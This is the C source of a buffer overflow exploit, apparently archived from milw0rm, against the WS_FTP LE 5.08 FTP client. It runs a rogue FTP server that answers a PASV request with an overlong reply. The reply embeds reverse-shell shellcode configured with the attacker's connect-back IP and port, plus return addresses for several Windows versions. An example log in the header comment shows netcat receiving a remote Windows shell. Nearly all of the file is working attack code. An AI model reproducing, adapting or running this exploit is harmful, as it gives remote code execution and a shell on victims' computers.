/*
ws_exp.c
WS_FTP LE 5.08 (PASV response) 0day buffer overflow exploit
Coded by h07 <h07@interia.pl>
Tested on XP SP2 Polish, 2000 SP4 Polish
Example:

C:\>ws_exp 1 192.168.0.1 4444

[*] WS_FTP LE 5.08 (PASV response) 0day buffer overflow exploit
[*] Coded by h07 <h07@interia.pl>
[+] Listening on 21
[+] Connection accepted from 192.168.0.3
[+] Client request: USER h07
[+] Client request: PWD
[+] Client request: SYST
[+] Client request: HELP
[+] Client request: PASV
[+] Sending buffer: OK
[*] Press enter to quit

C:\>nc -v -l -p 4444
listening on [any] 4444 ...
connect to [192.168.0.1] from (UNKNOWN) [192.168.0.3] 2809: NO_DATA
Microsoft Windows 2000 [Wersja 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

C:\Program Files\WS_FTP>
*/

#include <winsock2.h>
#define PORT 21
#define BUFF_SIZE 1024
#define RESPONSE "200 blah blah\r\n"

typedef struct
 {
 char os_name[32];
 unsigned long ret;
 } target;

char shellcode[] =
/*
win32 reverse shellcode (thx metasploit.com)
bad chars: 0x00 0x20 0x0a 0x0d 0x28 0x29
*/
"\x2b\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x87"
"\x61\xbc\xd8\x83\xeb\xfc\xe2\xf4\x7b\x0b\x57\x95\x6f\x98\x43\x27"
"\x78\x01\x37\xb4\xa3\x45\x37\x9d\xbb\xea\xc0\xdd\xff\x60\x53\x53"
"\xc8\x79\x37\x87\xa7\x60\x57\x91\x0c\x55\x37\xd9\x69\x50\x7c\x41"
"\x2b\xe5\x7c\xac\x80\xa0\x76\xd5\x86\xa3\x57\x2c\xbc\x35\x98\xf0"
"\xf2\x84\x37\x87\xa3\x60\x57\xbe\x0c\x6d\xf7\x53\xd8\x7d\xbd\x33"
"\x84\x4d\x37\x51\xeb\x45\xa0\xb9\x44\x50\x67\xbc\x0c\x22\x8c\x53"
"\xc7\x6d\x37\xa8\x9b\xcc\x37\x98\x8f\x3f\xd4\x56\xc9\x6f\x50\x88"
"\x78\xb7\xda\x8b\xe1\x09\x8f\xea\xef\x16\xcf\xea\xd8\x35\x43\x08"
"\xef\xaa\x51\x24\xbc\x31\x43\x0e\xd8\xe8\x59\xbe\x06\x8c\xb4\xda"
"\xd2\x0b\xbe\x27\x57\x09\x65\xd1\x72\xcc\xeb\x27\x51\x32\xef\x8b"
"\xd4\x22\xef\x9b\xd4\x9e\x6c\xb0\x87\x61\xbc\xd8\xe1\x09\xbc\xd8"
"\xe1\x32\x35\x39\x12\x09\x50\x21\x2d\x01\xeb\x27\x51\x0b\xac\x89"
"\xd2\x9e\x6c\xbe\xed\x05\xda\xb0\xe4\x0c\xd6\x88\xde\x48\x70\x51"
"\x60\x0b\xf8\x51\x65\x50\x7c\x2b\x2d\xf4\x35\x25\x79\x23\x91\x26"
"\xc5\x4d\x31\xa2\xbf\xca\x17\x73\xef\x13\x42\x6b\x91\x9e\xc9\xf0"
"\x78\xb7\xe7\x8f\xd5\x30\xed\x89\xed\x60\xed\x89\xd2\x30\x43\x08"
"\xef\xcc\x65\xdd\x49\x32\x43\x0e\xed\x9e\x43\xef\x78\xb1\xd4\x3f"
"\xfe\xa7\xc5\x27\xf2\x65\x43\x0e\x78\x16\x40\x27\x57\x09\x4c\x52"
"\x83\x3e\xef\x27\x51\x9e\x6c\xd8";

char buffer[BUFF_SIZE];

target list[] =
 {
 "XP SP2 Polish",
 0x7d16887b, //JMP ESI

 "2000 SP4 Polish",
 0x776f2015, //JMP ESI

 "XP SP2 English",
 0x7cb9e082, //JMP ESI

 "2000 SP4 English",
 0x7848a5f1, //JMP ESI

 "XP SP2 German",
 0x7ca96834  //JMP ESI
 };

void config_shellcode(unsigned long ip, unsigned short port)
 {
 memcpy(&shellcode[184], &ip, 4);
 memcpy(&shellcode[190], &port, 2);
 }

int main(int argc, char *argv[])
{
WSADATA wsa;
int sock, cl, len, os, r_len, i,
a = (sizeof(list) / sizeof(target)) - 1;
unsigned long connectback_IP, eip;
unsigned short connectback_port;
struct sockaddr_in server, client;

printf("\n[*] WS_FTP LE 5.08 (PASV response) 0day buffer overflow exploit\n");
printf("[*] Coded by h07 <h07@interia.pl>\n");

if(argc < 4)
 {
 printf("[*] Usage: %s <system> <connectback_IP> <connectback_port>\n", argv[0]);
 printf("[*] Sample: %s 0 192.168.0.1 4444\n", argv[0]);
 printf("[*] Systems..\n");
 for(i = 0; i <= a; i++)
 printf("[>] %d: %s\n", i, list[i].os_name);
 return 1;
 }

WSAStartup(MAKEWORD(2, 0), &wsa);

os = atoi(argv[1]);

if((os < 0) || (os > a))
 {
 printf("[-] Error: unknown target %d\n", os);
 return -1;
 }

eip = list[os].ret;
connectback_IP = inet_addr(argv[2]) ^ (ULONG)0xd8bc6187;
connectback_port = htons(atoi(argv[3])) ^ (USHORT)0xd8bc;
config_shellcode(connectback_IP, connectback_port);

if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
 {
 printf("[-] Socket error\n");
 return -1;
 }

server.sin_family = AF_INET;
server.sin_addr.s_addr = htonl(INADDR_ANY);
server.sin_port = htons(PORT);

bind(sock, (struct sockaddr *) &server, sizeof(server));
listen(sock, 1);

printf("[+] Listening on %d\n", PORT);

len = sizeof(client);
cl = accept(sock, (struct sockaddr *) &client, &len);

printf("[+] Connection accepted from %s\n", inet_ntoa(client.sin_addr));

send(cl, "200 evil server ready :>\r\n", 26, 0);

for(i = 0; i <= 3; i++)
 {
 memset(buffer, 0x00, BUFF_SIZE);
 recv(cl, buffer, BUFF_SIZE - 1, 0);
 printf("[+] Client request: %s", buffer);
 send(cl, RESPONSE, strlen(RESPONSE), 0);
 }

//PASV request
memset(buffer, 0x00, BUFF_SIZE);
recv(cl, buffer, BUFF_SIZE - 1, 0);
printf("[+] Client request: %s", buffer);

//PASV response
r_len = 1011;
memset(buffer, 0x90, BUFF_SIZE);
memcpy(buffer, "200 \x31\xc0", 6);
memcpy(buffer + 6, shellcode, sizeof(shellcode) - 1);
*((unsigned long*)(&buffer[r_len])) = eip;
memcpy(buffer + (r_len + 4), "\r\n\x00", 3);

if(send(cl, buffer, strlen(buffer), 0) != -1)
printf("[+] Sending buffer: OK\n");
else
printf("[-] Sending buffer: failed\n");

printf("[*] Press enter to quit\n");
getchar();

return 0;
}

// milw0rm.com [2006-09-20]
